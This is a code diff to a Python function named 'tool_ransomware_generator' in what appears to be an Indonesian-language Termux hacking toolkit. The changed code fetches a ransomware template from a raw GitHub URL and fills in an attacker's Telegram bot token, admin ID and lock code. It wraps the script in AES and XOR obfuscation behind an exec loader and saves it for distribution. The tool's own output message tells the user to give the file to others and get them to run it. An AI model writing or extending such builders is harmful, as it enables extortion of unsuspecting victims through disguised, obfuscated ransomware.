@@ -11688,11 +11688,25 @@ def tool_telegram_spam():
 def tool_ransomware_generator():
     import os, sys, time, json, random, string, base64, hashlib, subprocess
     from datetime import datetime
-    from Crypto.Cipher import AES
-    from Crypto.Util.Padding import pad
-    from Crypto.Random import get_random_bytes
+    try:
+        from Crypto.Cipher import AES
+        from Crypto.Util.Padding import pad
+        from Crypto.Random import get_random_bytes
+    except ImportError:
+        print(f"{R}[!] Install pycryptodome dulu: pip install pycryptodome{N}")
+        time.sleep(2)
+        return
 
     os.system('clear')
+    
+    R = '\033[91m'
+    G = '\033[92m'
+    Y = '\033[93m'
+    W = '\033[97m'
+    C = '\033[96m'
+    U = '\033[95m'
+    N = '\033[0m'
+    a = '\033[1;30m'
 
     ascii_ransom = """
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⡀⡀⡀⡀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -11736,7 +11750,7 @@ def tool_ransomware_generator():
     print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
     password = input(f"{U}❯❯❯ {W}Masukkan Password {G}❯ {N}").strip()
     if not password:
-        print(f"{W}[ {R}??{W} ] Password Tidak boleh kosong{N}")
+        print(f"{W}[ {R}✗{W} ] Password Tidak boleh kosong{N}")
         input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
         return
 
@@ -11746,7 +11760,7 @@ def tool_ransomware_generator():
     print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
     bot_token = input(f"{U}❯❯❯ {W}Masukkan Token Bot {G}❯ {N}").strip()
     if not bot_token:
-        print(f"{W}[ {R}??{W} ] Token Bot WAJIB diisi!{N}")
+        print(f"{W}[ {R}✗{W} ] Token Bot WAJIB diisi!{N}")
         input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
         return
 
@@ -11756,31 +11770,32 @@ def tool_ransomware_generator():
     print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
     admin_id = input(f"{U}❯❯❯ {W}Masukkan ID Admin {G}❯ {N}").strip()
     if not admin_id:
-        print(f"{W}[ {R}??{W} ] ID Admin WAJIB diisi!{N}")
+        print(f"{W}[ {R}✗{W} ] ID Admin WAJIB diisi!{N}")
         input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
         return
 
-    script_dir = os.path.dirname(os.path.abspath(__file__))
-    template_path = os.path.join(script_dir, "item", "ransomware.py")
+    raw_url = "https://raw.githubusercontent.com/OoTotapxciwiiekfkdoapz1910la9911729Kh1/ransomware/refs/heads/main/ransomware.py"
     
-    if not os.path.exists(template_path):
+    try:
+        resp = requests.get(raw_url, timeout=10)
+        if resp.status_code != 200:
+            return
+        real_script = resp.text
+    except Exception as e:
         return
-    
-    with open(template_path, "r", encoding="utf-8") as f:
-        template = f.read()
-    
-    real_script = template
-    real_script = real_script.replace('BOT_TOKEN = ""', f'BOT_TOKEN = "{bot_token}"')
-    real_script = real_script.replace('ADMIN_ID = ""', f'ADMIN_ID = "{admin_id}"')
-    real_script = real_script.replace('LOCK_CODE = ""', f'LOCK_CODE = "{password}"')
-    
+        
+    real_script = real_script.replace("{{BOT_TOKEN}}", bot_token)
+    real_script = real_script.replace("{{ADMIN_ID}}", admin_id)
+    real_script = real_script.replace("{{LOCK_CODE}}", password)
+
     aes_key = get_random_bytes(32)
     iv = get_random_bytes(16)
     cipher = AES.new(aes_key, AES.MODE_CBC, iv)
-    encrypted = cipher.encrypt(pad(real_script.encode(), AES.block_size))
+    padded = pad(real_script.encode(), AES.block_size)
+    encrypted = cipher.encrypt(padded)
     encrypted_b64 = base64.b64encode(encrypted).decode()
     
-    xor_key = os.urandom(32)
+    xor_key = get_random_bytes(32)
     raw_encoded = encrypted_b64.encode()
     xored = bytes([b ^ xor_key[i % len(xor_key)] for i, b in enumerate(raw_encoded)])
     xored_b64 = base64.b64encode(xored).decode()
@@ -11798,7 +11813,12 @@ exec(compile(unpad(AES.new(_e,AES.MODE_CBC,_f).decrypt(_d),16).decode(),"<string
 '''
     
     output_dir = "/sdcard/Ransomware"
-    os.makedirs(output_dir, exist_ok=True)
+    try:
+        os.makedirs(output_dir, exist_ok=True)
+    except:
+        output_dir = os.path.join(os.path.expanduser("~"), "storage", "Ransomware")
+        os.makedirs(output_dir, exist_ok=True)
+    
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     filename = f"ransomware_{timestamp}.py"
     filepath = os.path.join(output_dir, filename)
@@ -11821,7 +11841,6 @@ exec(compile(unpad(AES.new(_e,AES.MODE_CBC,_f).decrypt(_d),16).decode(),"<string
     print(f"{W}│ Cukup Kasih orang dan suruh run di Termux nya😹")
     print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
         
-    
     input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def menu_utama():
